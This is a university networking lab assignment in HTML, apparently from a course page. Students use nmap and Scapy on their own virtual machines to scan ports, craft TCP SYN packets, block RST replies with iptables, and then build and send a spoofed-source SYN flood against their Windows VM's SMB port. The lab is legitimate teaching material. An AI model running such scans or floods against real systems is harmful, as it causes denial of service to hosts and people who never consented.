@@ -1,0 +1,395 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<title>Scapy 2 Assignment</title>
+<meta name="author" content="RAMontante"/>
+<meta name="date" content="2016-12-28"/>
+<base href="https://montcs.bloomu.edu" />
+<style type="text/css">
+@import url("/css/generic.css");
+@import url("/css/pagefmt.css");
+@import url("/css/w3cvalid.css");
+
+body {
+    font-size:12pt;
+    width:8.5in;
+    margin:0;
+    padding:0.25in;
+}
+
+h3 { margin-bottom:1ex; margin-top:4ex;padding-top:0.5ex;border-top: 1px solid #ddd; }
+
+h4 { margin-bottom:1ex; }
+
+ol { margin-top:1ex; }
+ol li { margin-top:0ex; margin-bottom:1ex; padding:0;border-top:1px dotted #999;}
+
+.code,
+code {
+    padding-left:2px;padding-right:2px;margin-bottom:1.5ex;
+    color:#600;background:#e0e0e0;border:1px dotted #666;
+    font-size:105%;
+    font-weight:normal;
+}
+div.code {page-break-inside:avoid;}
+
+pre {background:#e0e0e0}
+
+.filter {
+    padding:2px;
+    color:#000;background:#dfd;
+    border:1px dotted #666;
+    font-weight:normal;
+}
+
+ul.python {
+    margin-left:3em;
+    margin-top:0.5ex;
+    list-style:outside '>>> ';
+}
+ul.code li,
+ul.python li {
+    border:none;
+    padding-top:0.2ex;
+    padding-bottom:0.0ex;
+    margin-bottom:0.5ex;
+}
+
+ul.pycode {
+    border:1px dotted #666;
+    padding-left:2px;padding-right:2px;margin-bottom:1.5ex;
+    margin-left:3em;
+    margin-top:0.5ex;
+    padding:2px;
+    list-style:outside '>>> ';
+    background:#ffd;
+}
+ul.code>li,
+ul.pycode>li {
+    border:none;
+    padding-top:0.2ex;
+    padding-bottom:0.0ex;
+    padding-left:4px;
+    margin-bottom:0.5ex;
+}
+
+ul.compact {
+    list-style: inside square;
+}
+
+div#title {
+    float:left;
+    font-size: 14pt;
+    font-weight: bold;
+    margin: 0;
+    padding: 0;
+    border:1px solid red;
+}
+div#title p {
+    width: 3.45in;
+    margin: 0ex 0em 0ex 2em;
+    text-indent: -2em;
+    padding: 0;
+}
+
+div#SigBlock {
+    float:left;
+    width:3in;height:0.75in;
+    vertical-align:top;
+    border:1px solid #000;padding:1em;
+}
+
+</style>
+<script type="text/javascript" src="/js/utilities.js"></script>
+<script type="text/javascript" src="/js/numQs.js"></script>
+</head>
+<body onload="numberItems('Question&nbsp;', 'inum');">
+<div id="title">
+<p class="asn">Network assignment:<br/>Scapy and Wireshark</p>
+</div><!-- title -->
+<div id="SigBlock" class="HIDE"><span class="">Name:</span></div>
+<!-- ==================================================================== -->
+
+<div class="smaller">
+<h3>assignment format</h3>
+<p>
+This assignment contains labeled, numbered questions that  need written answers.
+Other questions are for you to think about, but don't need a written
+answer.
+</p>
+<p>
+Write the answers in a text file or word-processor document, then upload the file through
+the "Submit" link on the course webpage.
+You may also write out the answers by hand if necessary.
+</p>
+<p>
+ Format the answer file like this:
+</p>
+<div class="code inset smaller width550"><pre>
+    YOUR NAME
+    Assignment name/number
+    Date
+
+    1.  Answer to first question.
+        <em style="font-size:80%;color:#600">(Example:  "I installed the Windows version in a virtual
+        machine running DOS 3.21.  I started it using the DOS
+        command RUN WIRESHARK IN WINDOWS.  This doesn't work.")</em>
+
+    2.  Answer to second question.
+        <em style="font-size:80%;color:#600">(Example:  "My network interface is called Billy.")</em>
+
+    3.  Answer to third question.
+
+    ...  and so forth.
+</pre></div>
+</div>
+
+<h1>Scapy and Layer 3/Layer 4</h1>
+
+<p>
+In this assignment you will use scapy to create and use IP and UDP packets.
+</p><p>
+Scapy's Layer-2 commands "<tt>sendp()</tt>", "<tt>srp()</tt>", and "<tt>srp1()</tt>" are used to send Ethernet frames directly.
+There are similar commands for sending Layer-3 (IP) and Layer-4 (UDP, TCP) packets &mdash; the "<tt>send()</tt>" command automatically adds a suitable Ethernet header to a Layer-3 packet, and sends out the resulting frame.
+The "<tt>sr()</tt>" command adds an Ethernet header, sends out the packet, and collects the (expected) response packets;  "<tt>sr1()</tt>" is like "<tt>sr()</tt>", but only collects the first response packet.
+</p><p>
+You need to do this assignment on your virtual network.
+(If you have set up a virtual network on your personal computer, you can do it there.)
+You also need to have set up the FTP service on your Windows VM (servers worksheet).
+The UDP part has to be done on campus.
+</p>
+
+<h3>preliminary</h3>
+First start your access router, Linux VM, and Windows VM.
+Verify each VM's IP address.
+<p>
+Use the "zenmap/nmap" software to find a vulnerability in your Windows VM:
+</p>
+<ol><li>
+    From your Linux VM's terminal, run the command <code>sudo zenmap</code>.
+    Zenmap will open up a window that is an interface to "nmap".
+</li><li>
+    In the box labeled "Command:" (upper left), enter the line <tt class="boxed">nmap&nbsp;&nbsp;-sS&nbsp;&nbsp;-r&nbsp;&nbsp;-p&nbsp;1-8000</tt>.
+</li><li>
+    In the box labeled "Target:" (just above the "Command:" box), enter your Windows VM's IP address.
+    (Notice that it appears in the "Command:" box as well.)
+</li><li>
+    Click on "Scan".
+    This scan should take a few minutes.
+</li><li>
+    In the lower right pane, you should see a list of ports that are open and listening on your Windows VM.
+    There should be at least one, port 445 (SMB service port).
+    If you have done the server-installation exercise you may also see port 21 (FTP control port).
+    There may be others, perhaps port 135, 139, or 5357.
+</li><li>
+    Close the zenmap window.
+    You don't need to save any changes.
+</li></ol>
+
+<div id="SYN" class="">
+<h2>Playing with IP packets</h2>
+<ol class="pycode"><li>
+    Start scapy in a terminal on your Linux VM: <code>sudo scapy</code>.
+    Also start Wireshark from another terminal: <code>sudo wireshark</code>.
+
+</li><li>
+    Look at scapy's defaults for an IP header, and create an IP packet that targets your Windows VM.
+    Replace <span class="fake red">Windows-IP</span> with your Windows VM's IP address (which should be something like "192.168.100.53").
+    <ul class="pycode"><li>
+        IP().show()
+    </li><li>
+        winip = "<span class="fake red">Windows-IP</span>"&nbsp;&nbsp;<span class="Remark fake"># Windows VM's IP address, in quotes</span>
+    </li><li>
+        iphdr = IP(dst=winip)
+    </li><li>
+        iphdr.show()
+    </li></ul>
+    <p class="inum">
+    What are the default source IP and destination IP addresses in the first IP() header fields?
+    </p><p class="inum">
+    What are the source IP and destination IP addresses in the iphdr header fields?
+    </p>
+
+</li><li>
+    Add a display filter to wireshark: 
+    <span class="filter">ip.addr==<span class="fake red">Windows-IP</span> || arp</span>
+    <br/>
+    Then send out the bare IP packet:
+    <ul class="pycode"><li>
+        send(iphdr)
+    </li></ul>
+    Wireshark shows the packet, but that's all that happens; the IP packet's real purpose is to carry a payload.
+    Some ARP frames precede it, identifying the matching MAC address.
+    <p>&nbsp;</p>
+
+</li><li> <!-- ======== -->
+    The operating system does not like receiving TCP SYN/ACKs when it didn't issue a TCP SYN packet, so it responds with a TCP RST (Reset) to shut the connections down.
+    Use the Linux "iptables" firewall to block these Resets:
+    <ul class="pycode"><li>
+        fwRule = 'iptables %s OUTPUT -p tcp --tcp-flags RST RST --dport 21 -j DROP'
+    </li><li>
+        os.system(fwRule % '-A')
+    </li></ul>
+    You may need to wait a minute or two for the rule change to take effect.
+
+</li><li> <!-- ======== -->
+    TCP sessions must begin with a 3-way handshake that connects to a desired server port.
+    This handshake uses a TCP "SYN packet", a packet containing a TCP header with the server port as the destination, and only the SYN flag set.
+    Create one with these commands:
+    <ul class="pycode"><li>
+        TCP().show()
+    </li><li>
+        smbp = 445      <span class="smaller fancyfont Remark"># SMB port</span>
+    </li><li>
+        smbsyn = TCP(dport=smbp)
+    </li><li>
+        smbsyn.show()
+    </li></ul>
+</li><li>
+    Modify wireshark's display filter: 
+    <span class="filter">ip.addr==<span class="fake red">Windows-IP</span>&nbsp;&amp;&amp;&nbsp;tcp</span>
+    <br/>
+    Then send the SYN packet, in an IP packet, and collect the response:
+    <ul class="pycode"><li>
+        response = sr1( iphdr/smbsyn )
+    </li><li>
+        response.show()
+    </li></ul>
+    <p class="inum">
+    Did wireshark show the TCP handshake completed normally?
+    </p>
+
+</li><li> <!-- ======== -->
+    Isolate the TCP header (and any payload) from the response:
+    <ul class="pycode"><li>
+        tcpr = response.getlayer(TCP)
+    </li><li>
+        tcpr.remove_payload()
+    </li><li>
+        tcpr.show()
+    </li><li>
+        print( '{:08b}'.format(tcpr.flags) )
+    </li></ul>
+    <p class="inum">
+    What is the binary value of the TCP flags field, and which flags are set?
+    </p><p class="inum">
+    What should scapy have sent back, to complete the TCP handshake?
+    </p>
+
+</li><li>
+    Create a graphical representation of the TCP response header:
+    <ul class="pycode"><li>
+        <span class="HIDE">conf.prog.pdfreader = 'evince'</span>
+        tcpr.pdfdump('tcpr.pdf')    <span class="smaller fancyfont Remark"># create .pdf file
+    </li></ul>
+    From a terminal in the Linux VM, issue the command:
+<pre class="code">
+evince tcpr.pdf
+</pre>
+    Note the Flags field (which is shown in hexadecimal), and the reported flags.
+
+</li><li>
+    Is there a Raw payload?
+    Why?
+    (Hint: look at the length of the response with:
+    <ul class="pycode"><li>
+        len(response)
+    </li></ul>
+    and compare that to the minimum payload length of an Ethernet frame.)
+
+</li></ol>
+</div><!-- SYN -->
+
+<div id="SYNflood" class="">
+<h2>A Denial-Of-Service (DOS) attack</h2>
+One way to perform a DOS attack is to send a large number of packets to a victim that initiate TCP connections but never complete them.
+The victim devotes system resources to each initiated connection, until it runs out of resources and perhaps crashes.
+This is called a "SYN flood" because the packets that initiate a TCP connection are packets with their SYN bit set.
+This works best if many machines (a botnet) can be commanded to all send SYN packets to the victim at the same time.
+For good measure, the source address is spoofed (to protect the guilty).
+<p>
+For this to work, the victim must be prepared to accept TCP connections on one (or more) of its server ports.
+Defenses against this include blocking all unused ports with a firewall, limiting the number of connections that the computer will accept at one time, and limiting the amount of time that the computer will reserve resources for the initiated connection.
+</p>
+<p>
+For this exercise assume that the Windows VM is listening on port 445.
+The "zenmap" program that you used earlier showed you a list of listening ports; any of those is acceptable as well. 
+</p>
+<ol><li>
+    Enter these commands to build an attack frame:
+    <ul class="pycode"><li>
+        goatIP = '192.168.<span class="fake red">x</span>.63'  <span class="smaller fancyfont Remark"># broadcast IP address as source!</span>
+    </li><li>
+        goatMAC = 'ff:ff:ff:ff:ff:ff'  <span class="smaller fancyfont Remark"># broadcast MAC address</span>
+    </li><li>
+        victim = '<span class="fake red">Windows-IP</span>'  <span class="smaller fancyfont Remark"># specify your Windows VM for dst</span>
+    </li><li>
+        victimport = 445        <span class="smaller fancyfont Remark"># SMB protocol usually runs on Windows</span>
+    </li><li>
+        tcp = TCP(dport=victimport)
+    </li><li>
+        tcp.show()      <span class="smaller fancyfont Remark"># flags should be set to S</span>
+    </li><li>
+        ip = IP(src=goatIP, dst=victim)
+    </li><li>
+        pad&nbsp;=&nbsp;Padding()
+    </li><li>
+        pad.load = '\x00' * (46 - len(ip/tcp))      <span class="smaller fancyfont Remark"># 46 == minimum Ethernet payload?</span>
+    </li><li>
+        eth = Ether(src=goatMAC)
+    </li><li class="">
+        synframe = eth/ip/tcp/pad
+    </li><li>
+        print(len(synframe))          <span class="smaller fancyfont Remark"># should equal 60</span>
+    </li><li>
+        synframe.show()
+    </li></ul>
+
+</li><li>
+    Put this display filter into Wireshark:
+<span class="filter">
+ip.addr==<span class="fake red">Windows-IP</span>&nbsp;&amp;&amp;&nbsp;(tcp.flags.syn==1&nbsp;||&nbsp;tcp.flags.ack==1)
+</span>
+    Stop it if it's already capturing packets, then start it to get a fresh capture.
+    Then send out the frame and collect any responses.
+    <ul class="pycode"><li>
+        srp(synframe)
+    </li></ul>
+    Look at the wireshark window.
+    <p class="inum">
+    How many total packets does wireshark show?
+    <br/>
+    What kind(s) of packet, is returned?
+    <br/>
+    What is the apparent destination for the returned packets?
+    </p>
+</li><li>
+
+</li><li>
+    Send out a continual stream of frames, as fast as possible:
+    <ul class="pycode"><li>
+        srpflood(synframe)
+    </li></ul>
+    After a few seconds, press <strong class="tt">&lt;Ctrl&gt;-C</strong> to stop the flood.
+    <p class="">
+    Wireshark's default timestamp column (in the upper pane) counts seconds and fractions of seconds.
+    The leftmost column counts the packets.
+    </p>
+    <p class="inum">
+    How many total packets does wireshark show?
+    <br/>
+    How many packets per second did scapy send out?
+    </p>
+
+</li></ol>
+</div><!-- SYNflood -->
+
+<h3>shut down</h3>
+<p>
+Close down scapy by entering the <code>exit()</code> command.
+</p>
+
+</div><!-- content -->
+<script type="text/javascript">ts_validate();</script>
+</body></html>
